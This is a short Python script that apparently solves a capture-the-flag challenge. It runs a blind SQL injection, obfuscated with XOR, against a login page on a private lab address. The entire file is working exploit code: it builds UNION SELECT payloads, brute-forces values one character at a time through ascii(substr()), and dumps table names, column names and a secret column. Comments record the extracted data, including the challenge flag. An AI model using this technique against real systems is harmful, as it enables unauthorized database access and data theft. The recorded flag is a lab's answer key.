from requests import *
from urllib.parse import quote
import string

URL = 'http://10.11.4.98/0351d68b68e227cb738531b350e946c5/?name=%s&pass=%s'
SERVER_NAME = '10.11.4.98'

def XOR(s1, s2):
	return ''.join( chr(ord(s1[i])^ord(s2[i%len(s2)])) for i in range(len(s1)) )

def SendPayload(payload):
	final_url = URL%(quote(XOR("' union select 1,'c81e728d9d4c2f636f067f89cc14862c' from dual where ascii(substr((%s),%s,1))=%s;-- -"%(payload[0], payload[1], payload[2]), SERVER_NAME)), '2')
	res = get(final_url)
	return res.text

def Exploit(query):
	result = ''; i = 1
	while 1:
		completed = 0
		for letter in range(32, 256):
			res = SendPayload([query, i, letter])
			success = 1 if 'Welcome User!' in res else 0
			if success: 
				completed = 1
				result += chr(letter)
				print(result)
				break
		if completed == 0: return result
		i += 1

print('Table Names :', Exploit('select group_concat(table_name) from information_schema.tables where table_schema=database()')) # users
print('Column Names :', Exploit('select group_concat(column_name) from information_schema.columns where table_name="users"')) # id,username,password,proffission,secret
print('Secret Column Values :', Exploit('select group_concat(secret) from users')) # ABCDEFGH,If I tell you, it won't be a secret anymore. XD,Why are you trying to see my secrets.,Fun fact: Peanuts arenÂ’t technically nuts.,Invader{Woah!...M@N_Ar3_Y0U_h4ck3r_0r_Wh@&!___#Bl0wn_my_m1nd___+_+},NULL
